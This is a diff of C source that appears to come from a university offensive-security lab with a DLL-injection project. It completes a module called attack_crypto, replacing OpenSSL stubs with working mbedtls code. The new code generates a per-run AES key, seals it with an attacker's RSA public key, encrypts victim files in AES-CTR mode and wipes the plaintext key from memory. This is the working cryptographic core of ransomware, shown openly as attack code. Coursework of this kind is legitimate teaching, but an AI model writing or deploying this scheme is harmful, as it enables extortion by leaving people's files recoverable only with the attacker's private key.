@@ -4,106 +4,209 @@
 #include <string.h>
 #include <stdbool.h>
 
-#include "get_dir.h"
+#include "mbedtls/aes.h"
+#include "mbedtls/ctr_drbg.h"
+#include "mbedtls/entropy.h"
+#include "mbedtls/pk.h"
+#include "mbedtls/rsa.h"
+#include "mbedtls/md.h"
 
-#define KEY_SIZE 16
-#define IV_SIZE 16
-#define MAX_PATH 260
+/* AES-128 */
+#define KEY_SIZE    16 
+#define IV_SIZE     16
+#define BUFFER_SIZE 4096
 
-/* Global variable for AES key */
-char *aes_key = NULL;
+/* Global variables for AES key */
 
-/* Error handler */
-void handle_error(const char *msg)
+static unsigned char aes_key[KEY_SIZE];
+static bool key_loaded = false;
+
+/* Global variables for mbedtls crypto */
+
+static mbedtls_entropy_context entropy;
+static mbedtls_ctr_drbg_context ctr_drbg;
+static bool rng_initialized = false;
+
+/* Error handling */
+static void handle_error(const char *msg)
 {
     fprintf(stderr, "Error: %s\n", msg);
     exit(EXIT_FAILURE);
 }
 
-/* Generate a 16-byte IV for AES-128-CTR: 8-byte nonce + 8-byte counter initialized to 0 */
-void make_ctr_iv(unsigned char iv[16]) {
-    uint64_t nonce;
-    uint64_t counter = 0;
-
-    if (RAND_bytes((unsigned char*)&nonce, sizeof(nonce)) != 1)
-        handle_error("RAND_bytes failed for nonce");
-
-    //Convert to big-endian for CTR mode
-    for (int i = 0; i < 8; i++) {
-        iv[i] = (nonce >> (56 - i * 8)) & 0xFF;
-        iv[8 + i] = (counter >> (56 - i * 8)) & 0xFF;
-    }
-}
-
-/* Save generated key to a .bin file */
-int save_key_to_file(const char *path, const unsigned char *key, size_t key_len) {
-    FILE *f = fopen(path, "wb");
-    if (!f) return 0;
-
-    if (fwrite(key, 1, key_len, f) != key_len) {
-        fclose(f);
-        return 0;
-    }
-
-    fclose(f);
-    return 1;
-}
-
-int rsa_encrypt_key(){
-    return 0;
-}
-
-
-/* Encrypt a file with AES-128-CTR */
-int encrypt_file_aes_ctr(const char *source, const char *target)
+/* Initialize the mbedtls state */
+static void rng_init(void)
 {
-    FILE *infile = fopen(source, "rb");
-    if (!infile) handle_error("Cannot open input file");
+    const char *pers = "aes_file_encryptor";
 
-    FILE *outfile = fopen(target, "wb");
-    if (!outfile) {
-        fclose(infile);
-        handle_error("Cannot open output file");
+    if (rng_initialized)
+        return;
+
+    mbedtls_entropy_init(&entropy);
+    mbedtls_ctr_drbg_init(&ctr_drbg);
+
+    if (mbedtls_ctr_drbg_seed(
+            &ctr_drbg,
+            mbedtls_entropy_func,
+            &entropy,
+            (const unsigned char *)pers,
+            strlen(pers)) != 0)
+    {
+        handle_error("RNG initialization failed");
     }
 
-    unsigned char key[KEY_SIZE];
+    rng_initialized = true;
+}
+
+/* Write random bytes for key and IVs */
+static void random_bytes(unsigned char *buf, size_t len) {
+    rng_init();
+    if (mbedtls_ctr_drbg_random(&ctr_drbg, buf, len) != 0)
+        handle_error("Random generation failed");
+}
+
+/* Encrypt AES key with public RSA key */
+static void save_encrypted_key_rsa(const unsigned char *key, size_t key_len, const char *pubkey_file, const char *out_file) {
+    mbedtls_pk_context pk;
+    mbedtls_pk_init(&pk);
+
+    if (mbedtls_pk_parse_public_keyfile(&pk, pubkey_file) != 0)
+        handle_error("Failed to load RSA public key");
+
+    if (!mbedtls_pk_can_do(&pk, MBEDTLS_PK_RSA))
+        handle_error("Public key is not RSA");
+
+    mbedtls_rsa_context *rsa = mbedtls_pk_rsa(pk);
+
+    // Set PKCS#1 v1.5 padding
+    if (mbedtls_rsa_set_padding(rsa, MBEDTLS_RSA_PKCS_V15, 0) != 0)
+        handle_error("Failed to set RSA PKCS#1 v1.5 padding");
+
+    size_t rsa_len = mbedtls_pk_get_len(&pk);
+    unsigned char *cipher = malloc(rsa_len);
+    if (!cipher)
+        handle_error("malloc failed");
+
+    // PKCS#1 v1.5 encryption
+    if (mbedtls_rsa_pkcs1_encrypt(
+        rsa,
+        mbedtls_ctr_drbg_random,  // RNG function
+        &ctr_drbg,                
+        key_len,                  // length of AES key
+        key,                      // input buffer
+        cipher                    // output buffer
+    ) != 0) {
+        free(cipher);
+        handle_error("RSA PKCS#1 encryption failed");
+    }
+
+    /* Write encrypted key to file */
+    FILE *f = fopen(out_file, "wb");
+    if (!f) {
+        free(cipher);
+        handle_error("Cannot open AES key output file");
+    }
+
+    if (fwrite(cipher, 1, rsa_len, f) != rsa_len) {
+        fclose(f);
+        free(cipher);
+        handle_error("Failed to write encrypted AES key");
+    }
+
+    /* Cleanup */
+    fclose(f);
+    free(cipher);
+    mbedtls_pk_free(&pk);
+}
+
+/* Initialize AES key for the whole session */
+static void ensure_aes_key_loaded(void)
+{
+    if (key_loaded)
+        return;
+
+    rng_init();
+
+    /* Always generate a new key once per run */
+    random_bytes(aes_key, KEY_SIZE);
+
+    save_encrypted_key_rsa(
+    aes_key,
+    KEY_SIZE,
+    "C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/build/public_key.pem",
+    "C:/Users/20231367/OneDrive - TU Eindhoven/Documents/Y3Q2/2IC80 Lab on Offensive Security/dll_injection/build/aes_key.bin"
+    );
+
+    key_loaded = true;
+}
+
+/* Encrypt one file */
+void encrypt_file_aes_ctr(const char *source, const char *target, const unsigned char *key) {
+    /* Open files */
+    FILE *in = fopen(source, "rb");
+    if (!in)
+        handle_error("Cannot open input file");
+
+    FILE *out = fopen(target, "wb");
+    if (!out)
+        handle_error("Cannot open output file");
+
+    /* Variables for keys and stream */
     unsigned char iv[IV_SIZE];
+    unsigned char nonce_counter[IV_SIZE];
+    unsigned char stream_block[16] = {0};
+    size_t nc_off = 0;
 
-    // Generate random key and IV 
-    if (RAND_bytes(key, KEY_SIZE) != 1) handle_error("RAND_bytes failed for key");
-    make_ctr_iv(iv);
+    /* Setup IV */
+    random_bytes(iv, IV_SIZE);
+    memcpy(nonce_counter, iv, IV_SIZE);
 
-    // Write IV at the start of the file
-    if (fwrite(iv, 1, IV_SIZE, outfile) != IV_SIZE) handle_error("Failed to write IV");
+    /* Write IV at start of file */
+    if (fwrite(iv, 1, IV_SIZE, out) != IV_SIZE)
+        handle_error("Failed to write IV");
+
+    /* Setup mbedtls AES contex */
+    mbedtls_aes_context aes;
+    mbedtls_aes_init(&aes);
+
+    if (mbedtls_aes_setkey_enc(&aes, key, 128) != 0)
+        handle_error("AES key setup failed");
 
     /* ENCRYPTION */
+    unsigned char buffer[BUFFER_SIZE];
+    size_t n;
 
-    // Cleanup
-    fclose(infile);
-    fclose(outfile);
+    while ((n = fread(buffer, 1, BUFFER_SIZE, in)) > 0)
+    {
+        if (mbedtls_aes_crypt_ctr(&aes, n, &nc_off, nonce_counter, stream_block, buffer, buffer) != 0)
+        {
+            handle_error("AES-CTR encryption failed");
+        }
 
-    return 0;
-}
-
-void clear_key_memory() {
-    
-}
-
-int attack_crypto(const char *input_file, const char *output_file)
-{
-    if (aes_key == NULL) {
-        /* TODO: keygen */
-        aes_key = "1";
-
-        /* TODO: save encrypted key to file, keep plain key in memory */
-        char *encrypted_key = rsa_encrypt_key();
-        save_key_to_file("key_location", encrypted_key, 128);
+        if (fwrite(buffer, 1, n, out) != n)
+            handle_error("Failed to write encrypted data");
     }
 
-    /* Encrypt file */
-    encrypt_file_aes_ctr(input_file, output_file, aes_key);
-
-    return 0;
+    /* Cleanup */
+    mbedtls_aes_free(&aes);
+    fclose(in);
+    fclose(out);
 }
 
-// Using MSVC OpenSSL with MinGW - FIX!
+/* Public API for cleaning the critical memory - plaintext AES key and mbedtls state variables */
+void crypto_cleanup(void)
+{
+    memset(aes_key, 0, sizeof(aes_key));
+    mbedtls_ctr_drbg_free(&ctr_drbg);
+    mbedtls_entropy_free(&entropy);
+    rng_initialized = false;
+    key_loaded = false;
+}
+
+/* Public API for encryption */
+int attack_crypto(const char *input_file, const char *output_file)
+{
+    ensure_aes_key_loaded();
+    encrypt_file_aes_ctr(input_file, output_file, aes_key);
+    return 0;
+}
